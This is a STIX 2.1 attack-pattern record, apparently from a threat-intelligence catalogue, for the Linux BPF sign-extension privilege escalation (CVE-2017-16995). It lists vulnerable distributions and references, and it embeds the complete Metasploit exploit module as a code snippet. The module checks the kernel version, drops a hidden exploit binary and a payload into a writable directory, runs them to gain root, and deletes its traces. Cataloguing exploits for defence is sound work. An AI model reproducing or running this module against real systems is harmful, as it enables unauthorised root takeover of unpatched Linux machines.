{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--96208d08-fe61-43f1-abe7-861129af71e6",
    "created": "2024-08-14T16:59:49.203952Z",
    "modified": "2024-08-14T16:59:49.203957Z",
    "name": "Linux BPF Sign Extension Local Privilege Escalation",
    "description": " Linux kernel prior to 4.14.8 contains a vulnerability in the Berkeley Packet Filter (BPF) verifier. The `check_alu_op` function performs incorrect sign extension which allows the verifier to be bypassed leading to arbitrary kernel read/write.  The target system must be compiled with BPF support and permit unprivileged access to BPF with `kernel.unprivileged_bpf_disabled` not set to 1.  This module has been tested successfully on:  Debian 9.0 kernel 4.9.0-3-amd64; Deepin 15.5 kernel 4.9.0-deepin13-amd64; ElementaryOS 0.4.1 kernel 4.8.0-52-generic; Fedora 24 kernel 4.5.5-300.fc24.x86_64; Fedora 25 kernel 4.8.6-300.fc25.x86_64; Fedora 26 kernel 4.11.8-300.fc26.x86_64; Fedora 27 kernel 4.13.9-300.fc27.x86_64; Gentoo 2.2 kernel 4.5.2-aufs-r; Linux Mint 17.3 kernel 4.4.0-89-generic; Linux Mint 18.0 kernel 4.8.0-58-generic; Linux Mint 18.3 kernel 4.13.0-16-generic; Mageia 6 kernel 4.9.35-desktop-1.mga6; Manjero 16.10 kernel 4.4.28-2-MANJARO; Solus 3 kernel 4.12.7-11.current; Ubuntu 14.04.1 kernel 4.4.0-89-generic; Ubuntu 16.04.2 kernel 4.8.0-45-generic; Ubuntu 16.04.3 kernel 4.10.0-28-generic; Ubuntu 17.04 kernel 4.10.0-19-generic; ZorinOS 12.1 kernel 4.8.0-39-generic.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/local/bpf_sign_extension_priv_esc.rb",
            "external_id": "bpf_sign_extension_priv_esc.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-16995"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/rlarabee/exploits/blob/master/cve-2017-16995/cve-2017-16995.c"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/brl/grlh/blob/master/get-rekt-linux-hardened.c"
        },
        {
            "source_name": "reference",
            "url": "https://cyseclabs.com/exploits/upstream44.c"
        },
        {
            "source_name": "reference",
            "url": "https://blog.aquasec.com/ebpf-vulnerability-cve-2017-16995-when-the-doorman-becomes-the-backdoor"
        },
        {
            "source_name": "reference",
            "url": "https://ricklarabee.blogspot.com/2018/07/ebpf-and-analysis-of-get-rekt-linux.html"
        },
        {
            "source_name": "reference",
            "url": "https://www.debian.org/security/2017/dsa-4073"
        },
        {
            "source_name": "reference",
            "url": "https://usn.ubuntu.com/3523-2/"
        },
        {
            "source_name": "reference",
            "url": "https://people.canonical.com/~ubuntu-security/cve/2017/CVE-2017-16995.html"
        },
        {
            "source_name": "reference",
            "url": "https://bugs.chromium.org/p/project-zero/issues/detail?id=1454"
        },
        {
            "source_name": "reference",
            "url": "http://openwall.com/lists/oss-security/2017/12/21/2"
        },
        {
            "source_name": "reference",
            "url": "https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=95a762e2c8c942780948091f8f2a4f32fce1ac6f"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = GreatRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Post::Linux::Priv\n  include Msf::Post::Linux::Compile\n  include Msf::Post::Linux::System\n  include Msf::Post::Linux::Kernel\n  include Msf::Post::File\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Linux BPF Sign Extension Local Privilege Escalation',\n        'Description' => %q{\n          Linux kernel prior to 4.14.8 contains a vulnerability in the Berkeley\n          Packet Filter (BPF) verifier. The `check_alu_op` function performs\n          incorrect sign extension which allows the verifier to be bypassed,\n          leading to arbitrary kernel read/write.\n\n          The target system must be compiled with BPF support and permit\n          unprivileged access to BPF with `kernel.unprivileged_bpf_disabled`\n          not set to 1.\n\n          This module has been tested successfully on:\n\n          Debian 9.0 kernel 4.9.0-3-amd64;\n          Deepin 15.5 kernel 4.9.0-deepin13-amd64;\n          ElementaryOS 0.4.1 kernel 4.8.0-52-generic;\n          Fedora 24 kernel 4.5.5-300.fc24.x86_64;\n          Fedora 25 kernel 4.8.6-300.fc25.x86_64;\n          Fedora 26 kernel 4.11.8-300.fc26.x86_64;\n          Fedora 27 kernel 4.13.9-300.fc27.x86_64;\n          Gentoo 2.2 kernel 4.5.2-aufs-r;\n          Linux Mint 17.3 kernel 4.4.0-89-generic;\n          Linux Mint 18.0 kernel 4.8.0-58-generic;\n          Linux Mint 18.3 kernel 4.13.0-16-generic;\n          Mageia 6 kernel 4.9.35-desktop-1.mga6;\n          Manjero 16.10 kernel 4.4.28-2-MANJARO;\n          Solus 3 kernel 4.12.7-11.current;\n          Ubuntu 14.04.1 kernel 4.4.0-89-generic;\n          Ubuntu 16.04.2 kernel 4.8.0-45-generic;\n          Ubuntu 16.04.3 kernel 4.10.0-28-generic;\n          Ubuntu 17.04 kernel 4.10.0-19-generic;\n          ZorinOS 12.1 kernel 4.8.0-39-generic.\n        },\n        'License' => MSF_LICENSE,\n        'Author' =>\n          [\n            'Jann Horn', # Discovery\n            'bleidl', # Discovery and get-rekt-linux-hardened.c exploit\n            'vnik', # upstream44.c exploit\n            'rlarabee', # cve-2017-16995.c exploit\n            'h00die', # Metasploit\n            'bcoles' # Metasploit\n          ],\n        'DisclosureDate' => '2017-11-12',\n        'Platform' => [ 'linux' ],\n        'Arch' => [ ARCH_X86, ARCH_X64 ],\n        'SessionTypes' => [ 'shell', 'meterpreter' ],\n        'Targets' => [[ 'Auto', {} ]],\n        'Privileged' => true,\n        'References' =>\n          [\n            [ 'BID', '102288' ],\n            [ 'CVE', '2017-16995' ],\n            [ 'EDB', '44298' ],\n            [ 'EDB', '45010' ],\n            [ 'URL', 'https://github.com/rlarabee/exploits/blob/master/cve-2017-16995/cve-2017-16995.c' ],\n            [ 'URL', 'https://github.com/brl/grlh/blob/master/get-rekt-linux-hardened.c' ],\n            [ 'URL', 'https://cyseclabs.com/exploits/upstream44.c' ],\n            [ 'URL', 'https://blog.aquasec.com/ebpf-vulnerability-cve-2017-16995-when-the-doorman-becomes-the-backdoor' ],\n            [ 'URL', 'https://ricklarabee.blogspot.com/2018/07/ebpf-and-analysis-of-get-rekt-linux.html' ],\n            [ 'URL', 'https://www.debian.org/security/2017/dsa-4073' ],\n            [ 'URL', 'https://usn.ubuntu.com/3523-2/' ],\n            [ 'URL', 'https://people.canonical.com/~ubuntu-security/cve/2017/CVE-2017-16995.html' ],\n            [ 'URL', 'https://bugs.chromium.org/p/project-zero/issues/detail?id=1454' ],\n            [ 'URL', 'http://openwall.com/lists/oss-security/2017/12/21/2'],\n            [ 'URL', 'https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=95a762e2c8c942780948091f8f2a4f32fce1ac6f' ]\n          ],\n        'Notes' =>\n          {\n            'AKA' => ['get-rekt-linux-hardened.c', 'upstream44.c'],\n            'Reliability' => [ REPEATABLE_SESSION ],\n            'Stability' => [ CRASH_OS_DOWN ]\n          },\n        'DefaultTarget' => 0\n      )\n    )\n    register_advanced_options([\n      OptString.new('WritableDir', [ true, 'A directory where we can write files', '/tmp' ])\n    ])\n  end\n\n  def base_dir\n    datastore['WritableDir'].to_s\n  end\n\n  def check\n    arch = kernel_hardware\n\n    unless arch.include?('x86_64')\n      return CheckCode::Safe(\"System architecture #{arch} is not supported\")\n    end\n\n    vprint_good(\"System architecture #{arch} is supported\")\n\n    release = kernel_release\n    if Rex::Version.new(release.split('-').first) > Rex::Version.new('4.14.11') ||\n       Rex::Version.new(release.split('-').first) < Rex::Version.new('4.0')\n      return CheckCode::Safe(\"Kernel version #{release} is not vulnerable\")\n    end\n\n    vprint_good(\"Kernel version #{release} appears to be vulnerable\")\n\n    if unprivileged_bpf_disabled?\n      return CheckCode::Safe('Unprivileged BPF loading is not permitted')\n    end\n\n    vprint_good('Unprivileged BPF loading is permitted')\n\n    if lkrg_installed?\n      return CheckCode::Safe('LKRG is installed')\n    end\n\n    vprint_good('LKRG is not installed')\n\n    if grsec_installed?\n      return CheckCode::Safe('grsecurity is in use')\n    end\n\n    vprint_good('grsecurity is not in use')\n\n    config = kernel_config\n\n    if config.nil?\n      return CheckCode::Detected('Could not retrieve kernel config')\n    end\n\n    unless config.include?('CONFIG_BPF_SYSCALL=y')\n      return CheckCode::Safe('Kernel config does not include CONFIG_BPF_SYSCALL')\n    end\n\n    vprint_good('Kernel config has CONFIG_BPF_SYSCALL enabled')\n\n    CheckCode::Appears\n  end\n\n  def exploit\n    if !datastore['ForceExploit'] && is_root?\n      fail_with(Failure::BadConfig, 'Session already has root privileges. Set ForceExploit to override.')\n    end\n\n    unless writable?(base_dir)\n      fail_with(Failure::BadConfig, \"#{base_dir} is not writable\")\n    end\n\n    # Upload exploit executable\n    executable_name = \".#{rand_text_alphanumeric(5..10)}\"\n    executable_path = \"#{base_dir}/#{executable_name}\"\n    if live_compile?\n      vprint_status('Live compiling exploit on system...')\n      upload_and_compile(executable_path, exploit_data('cve-2017-16995', 'exploit.c'))\n    else\n      vprint_status('Dropping pre-compiled exploit on system...')\n      upload_and_chmodx(executable_path, exploit_data('cve-2017-16995', 'exploit.out'))\n    end\n\n    # Upload payload executable\n    payload_path = \"#{base_dir}/.#{rand_text_alphanumeric(5..10)}\"\n    upload_and_chmodx(payload_path, generate_payload_exe)\n\n    # Launch exploit\n    print_status('Launching exploit ...')\n    output = cmd_exec(\"echo '#{payload_path} & exit' | #{executable_path} \")\n    output.each_line { |line| vprint_status line.chomp }\n    print_status(\"Cleaning up #{payload_path} and #{executable_path} ...\")\n    rm_f(executable_path)\n    rm_f(payload_path)\n  end\nend\n",
    "x_mitre_disclosure_date": "2017-11-12",
    "x_mitre_platforms": [
        "[ 'linux' ]"
    ]
}